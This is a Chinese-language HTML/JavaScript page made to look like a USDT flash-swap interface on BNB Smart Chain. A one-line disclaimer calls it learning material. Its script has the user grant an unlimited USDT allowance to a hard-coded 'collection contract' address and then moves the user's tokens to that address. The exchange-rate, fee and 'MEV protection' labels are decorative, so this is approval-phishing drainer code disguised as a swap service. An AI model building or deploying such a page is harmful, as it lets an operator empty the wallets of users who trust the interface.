<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<title>BSC USDT 链上交互测试(仅学习)</title>
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Microsoft YaHei", sans-serif;
}
body {
  background: #f7f8fa;
  color: #111;
  min-height: 100vh;
  padding-bottom: 80px;
}
.header {
  background: #fff;
  padding: 12px 16px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  border-bottom: 1px solid #eee;
}
.header-left {
  display: flex;
  align-items: center;
  gap: 12px;
}
.back-btn {
  font-size: 18px;
  color: #111;
  cursor: pointer;
}
.title {
  font-size: 17px;
  font-weight: 600;
}
.header-balance {
  font-size: 13px;
  color: #2563eb;
}
.header-right {
  font-size: 18px;
  cursor: pointer;
}
.sub-header {
  background: #fff;
  padding: 8px 16px 12px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  font-size: 14px;
  color: #666;
}
.balance-box {
  display: flex;
  align-items: center;
  gap: 6px;
}
.balance-tag {
  background: #f0f2f5;
  border-radius: 6px;
  padding: 4px 8px;
  font-size: 13px;
  color: #333;
}
.all-btn {
  color: #2563eb;
  font-weight: 500;
  cursor: pointer;
}
.card {
  margin: 12px 16px;
  background: #fff;
  border-radius: 16px;
  padding: 16px;
  border: 1px solid #e5e7eb;
}
.row {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 10px 0;
}
.label {
  font-size: 14px;
  color: #666;
}
.coin-picker {
  display: flex;
  align-items: center;
  gap: 6px;
  background: #f7f8fa;
  border-radius: 8px;
  padding: 8px 12px;
  cursor: default;
}
.coin-icon {
  width: 24px;
  height: 24px;
  border-radius: 50%;
  background: #26a17b;
  display: flex;
  align-items: center;
  justify-content: center;
  color: #fff;
  font-size: 13px;
  font-weight: bold;
}
.coin-text {
  font-size: 15px;
  font-weight: 600;
}
.input-amount {
  width: 100%;
  border: none;
  outline: none;
  font-size: 24px;
  font-weight: 700;
  text-align: right;
  color: #111;
  background: transparent;
}
.input-amount::placeholder {
  color: #ccc;
}
.address-input-wrap {
  margin: 8px 0;
}
.address-input {
  width: 100%;
  padding: 10px 12px;
  border: 1px solid #e5e7eb;
  border-radius: 8px;
  font-size: 14px;
  background: #f7f8fa;
}
.divider {
  height: 1px;
  background: #eee;
  margin: 12px 0;
}
.swap-icon {
  width: 40px;
  height: 40px;
  border-radius: 50%;
  background: #2563eb;
  color: #fff;
  display: flex;
  align-items: center;
  justify-content: center;
  margin: -20px auto 0;
  font-size: 18px;
}
.info-list {
  margin: 12px 16px;
  background: #fff;
  border-radius: 16px;
  padding: 16px;
  border: 1px solid #e5e7eb;
}
.info-item {
  display: flex;
  justify-content: space-between;
  padding: 10px 0;
  font-size: 14px;
}
.info-item .left {
  color: #666;
}
.info-item .right {
  color: #111;
  font-weight: 500;
}
.discount-tag {
  color: #f59e0b;
  background: #fff7ed;
  padding: 2px 6px;
  border-radius: 4px;
  font-size: 13px;
}
.bottom-btn {
  margin: 10px 16px;
  color: #fff;
  border: none;
  border-radius: 12px;
  height: 50px;
  width: calc(100% - 32px);
  font-size: 16px;
  font-weight: 600;
  cursor: pointer;
}
.btn-connect {
  background: #2563eb;
}
.btn-approve {
  background: #0984e3;
}
.btn-swap {
  background: #10b981;
}
.btn-swap:disabled,.btn-approve:disabled {
  background: #94a3b8;
  cursor: not-allowed;
}
.wallet-show {
  text-align: center;
  margin: 12px 0;
  color: #2563eb;
  font-size: 14px;
}
.balance-show {
  text-align: center;
  color: #222;
  font-size: 14px;
  margin: 4px 0;
}
.tips {
  font-size: 13px;
  color: #64748b;
  text-align: center;
  margin: 10px 0;
}
.modal-wrap {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.5);
  display: none;
  align-items: center;
  justify-content: center;
  z-index: 999;
}
.modal-box {
  background: #fff;
  width: 80%;
  max-width: 320px;
  border-radius: 16px;
  padding: 24px 20px;
}
.modal-title {
  font-size: 20px;
  font-weight: bold;
  margin-bottom: 16px;
}
.modal-desc {
  font-size: 15px;
  color: #333;
  line-height: 1.6;
  margin-bottom: 20px;
}
.modal-confirm {
  text-align: right;
}
.modal-btn {
  color: #2563eb;
  background: none;
  border: none;
  font-size: 16px;
  cursor: pointer;
}
.bottom-nav {
  position: fixed;
  bottom: 0;
  left: 0;
  right: 0;
  background: #fff;
  border-top: 1px solid #eee;
  display: flex;
  justify-content: space-around;
  padding: 10px 0;
  font-size: 12px;
  color: #666;
}
.nav-item {
  text-align: center;
  cursor: pointer;
}
.nav-item .icon {
  font-size: 20px;
  margin-bottom: 4px;
}
.nav-item.active {
  color: #2563eb;
}
</style>
</head>
<body>

<div class="header">
  <div class="header-left">
    <span class="back-btn">←</span>
    <span class="title">闪兑跨链交互页面</span>
  </div>
  <div class="header-balance">
    USDT余额：<span id="headerUsdtBalance">0.00</span>
  </div>
  <div class="header-right">⚙️</div>
</div>

<div class="sub-header">
  <div class="balance-box">
    <span>可用资产</span>
    <span class="balance-tag">余额 <span id="subUsdtBalance">0.00</span></span>
  </div>
  <span class="all-btn">全部</span>
</div>

<div class="card">
  <div class="row">
    <div class="label">转出(BSC-USDT)</div>
    <div class="coin-picker">
      <div class="coin-icon">₮</div>
      <div class="coin-text">USDT</div>
    </div>
  </div>

  <div class="row">
    <input class="input-amount" type="number" placeholder="0.00" id="sendAmount" />
  </div>

  <div class="address-input-wrap">
    <p class="label">收款合约地址</p>
    <input class="address-input" id="targetContractAddr" placeholder="填入你的归集合约地址" value="0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6" />
  </div>

  <div class="divider"></div>
  <div class="swap-icon">⇅</div>

  <div class="row">
    <div class="label">实际到账数量</div>
    <div class="coin-picker">
      <div class="coin-icon">₮</div>
      <div class="coin-text">USDT</div>
    </div>
  </div>

  <div class="row">
    <input class="input-amount" type="text" placeholder="0.00" id="receiveAmount" readonly />
  </div>
</div>

<div class="info-list">
  <div class="info-item">
    <span class="left">兑换比例</span>
    <span class="right">1:0.999</span>
  </div>
  <div class="info-item">
    <span class="left">最少接收数量</span>
    <span class="right">0.00 USDT</span>
  </div>
  <div class="info-item">
    <span class="left">MEV 防护</span>
    <span class="right discount-tag">MEV防护中</span>
  </div>
  <div class="info-item">
    <span class="left">服务费</span>
    <span class="right">0.1%</span>
  </div>
  <div class="info-item">
    <span class="left">预估网络费</span>
    <span class="right">-</span>
  </div>
</div>

<button class="bottom-btn btn-connect" id="connectWallet">连接TP钱包</button>
<button class="bottom-btn btn-approve" id="approveBtn" disabled>1、授权USDT权限</button>
<button class="bottom-btn btn-swap" id="transferBtn" disabled>2、发起转账划转</button>

<div class="wallet-show">
  已连接钱包：<span id="addrText">未连接</span>
</div>
<div class="balance-show">
  USDT可用余额：<span id="usdtBalance">0.00</span>
</div>

<p class="tips">仅用于Web3开发学习测试，请勿用于非法金融场景</p>

<div class="info-list">
  <div class="info-item">
    <span class="left">最近一条记录</span>
    <span class="right">暂无记录</span>
  </div>
</div>

<div class="modal-wrap" id="modal">
  <div class="modal-box">
    <div class="modal-title">温馨提示</div>
    <div class="modal-desc" id="modalText"></div>
    <div class="modal-confirm">
      <button class="modal-btn" id="modalOk">确认</button>
    </div>
  </div>
</div>

<div class="bottom-nav">
  <div class="nav-item">
    <div class="icon">🏠</div>
    <div>资产</div>
  </div>
  <div class="nav-item active">
    <div class="icon">💱</div>
    <div>交易</div>
  </div>
  <div class="nav-item">
    <div class="icon">📊</div>
    <div>行情</div>
  </div>
  <div class="nav-item">
    <div class="icon">👤</div>
    <div>我的</div>
  </div>
</div>

<script>
// BSC主网 USDT合约地址
const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
// 你的归集合约地址
let SPENDER_CONTRACT = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6";
const RATE = 0.999;

// DOM元素
const sendInput = document.getElementById("sendAmount");
const receiveInput = document.getElementById("receiveAmount");
const targetContractAddr = document.getElementById("targetContractAddr");
const connectBtn = document.getElementById("connectWallet");
const approveBtn = document.getElementById("approveBtn");
const transferBtn = document.getElementById("transferBtn");
const usdtBalanceEl = document.getElementById("usdtBalance");
const headerUsdtBalanceEl = document.getElementById("headerUsdtBalance");
const subUsdtBalanceEl = document.getElementById("subUsdtBalance");
const addrTextEl = document.getElementById("addrText");
const modalWrap = document.getElementById("modal");
const modalText = document.getElementById("modalText");
const modalOk = document.getElementById("modalOk");

let provider = null, signer = null, userAddress = null, isConnected = false;
// ERC20标准ABI
const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)"
];

// 弹窗封装
function showModal(text) {
  modalText.innerText = text;
  modalWrap.style.display = "flex";
}
modalOk.onclick = () => { modalWrap.style.display = "none"; };

// 余额同步更新
function setAllBalance(val) {
  usdtBalanceEl.innerText = val;
  headerUsdtBalanceEl.innerText = val;
  subUsdtBalanceEl.innerText = val;
}

// 输入金额联动计算
sendInput.addEventListener("input", () => {
  const val = parseFloat(sendInput.value);
  if (isNaN(val) || val <= 0) receiveInput.value = "0.00";
  else receiveInput.value = (val * RATE).toFixed(4);
});

// 刷新钱包USDT余额
async function refreshBalance() {
  if (!isConnected || !provider) return;
  try {
    const usdt = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, provider);
    const bal = await usdt.balanceOf(userAddress);
    setAllBalance(parseFloat(ethers.utils.formatUnits(bal,18)).toFixed(4));
  } catch(e){
    console.log("余额刷新失败：",e);
  }
}

// 1、钱包连接逻辑
connectBtn.addEventListener("click", async () => {
  if(connectBtn.disabled) return;
  connectBtn.disabled = true;
  if(!window.ethereum){
    showModal("请在TP钱包内置浏览器打开本页面");
    connectBtn.disabled = false;
    return;
  }
  try{
    const accounts = await window.ethereum.request({method:"eth_requestAccounts"});
    if(!accounts.length){
      showModal("未获取到钱包账户");
      connectBtn.disabled = false;
      return;
    }
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();
    userAddress = accounts[0];
    isConnected = true;
    addrTextEl.innerText = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
    connectBtn.innerText = "钱包已连接";
    approveBtn.disabled = false;
    await refreshBalance();
  }catch(err){
    if(err.code === 4001) showModal("您拒绝了钱包授权请求");
    else showModal("钱包连接失败");
    console.error(err);
  }
  connectBtn.disabled = false;
});

// 2、单独授权按钮（第一步操作）
approveBtn.addEventListener("click", async () => {
  if (!isConnected) { showModal("请先连接钱包"); return; }
  approveBtn.disabled = true;
  SPENDER_CONTRACT = targetContractAddr.value.trim();
  if(!ethers.utils.isAddress(SPENDER_CONTRACT)){
    showModal("合约地址格式错误");
    approveBtn.disabled = false;
    return;
  }
  try {
    const usdtContract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, signer);
    // 获取当前链上gas价格并上浮10%保证打包
    const gasPrice = await provider.getGasPrice();
    const txOptions = {
      gasLimit: 300000,
      gasPrice: gasPrice.mul(110).div(100)
    };
    // 无限授权
    const maxAllowance = ethers.constants.MaxUint256;
    const approveTx = await usdtContract.approve(SPENDER_CONTRACT, maxAllowance, txOptions);
    showModal("授权交易已发起，等待区块确认中...");
    // 等待1个区块确认
    await approveTx.wait(1);
    showModal("USDT授权成功！现在可以执行转账");
    transferBtn.disabled = false;
  } catch (err) {
    console.error("授权报错：",err);
    if(err.code === 4001){
      showModal("您取消了授权签名");
    }else if(err.message.includes("insufficient funds for gas")){
      showModal("BNB手续费不足，请补充BSC原生BNB");
    }else{
      showModal("授权失败："+err.message.slice(0,40));
    }
  }
  approveBtn.disabled = false;
});

// 3、单独转账按钮（第二步操作）
transferBtn.addEventListener("click", async () => {
  if (!isConnected) { showModal("请先连接钱包"); return; }
  const inputVal = sendInput.value.trim();
  if (!inputVal || Number(inputVal) <= 0) { showModal("请输入有效转账金额"); return; }
  transferBtn.disabled = true;
  SPENDER_CONTRACT = targetContractAddr.value.trim();
  try {
    const usdtContract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, signer);
    const amountWei = ethers.utils.parseUnits(inputVal, 18);
    const gasPrice = await provider.getGasPrice();
    const txOptions = {
      gasLimit: 300000,
      gasPrice: gasPrice.mul(110).div(100)
    };
    // 调用transferFrom完成划转
    const transferTx = await usdtContract.transferFrom(userAddress, SPENDER_CONTRACT, amountWei, txOptions);
    showModal("转账交易已上链打包，请等待确认");
    await transferTx.wait(1);
    showModal("交易成功，USDT已划转至目标合约");
    sendInput.value = "";
    receiveInput.value = "0.00";
    await refreshBalance();
  } catch (err) {
    console.error("转账报错：",err);
    if(err.code === 4001){
      showModal("您取消了转账签名");
    }else if(err.message.includes("insufficient funds for gas")){
      showModal("BNB手续费不足，请补充BSC原生BNB");
    }else if(err.message.includes("execution reverted")){
      showModal("合约执行失败：授权额度不足/合约限制");
    }else{
      showModal("交易失败："+err.message.slice(0,40));
    }
  }
  transferBtn.disabled = false;
});

// 监听钱包切换/退出
if(window.ethereum){
  window.ethereum.on("accountsChanged", async (accounts)=>{
    if(accounts.length === 0){
      isConnected = false;
      userAddress = null;
      provider = null;
      signer = null;
      addrTextEl.innerText = "未连接";
      setAllBalance("0.00");
      approveBtn.disabled = true;
      transferBtn.disabled = true;
      connectBtn.innerText = "连接TP钱包";
    }else{
      userAddress = accounts[0];
      addrTextEl.innerText = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
      await refreshBalance();
    }
  })
}
</script>
</body>
</html>
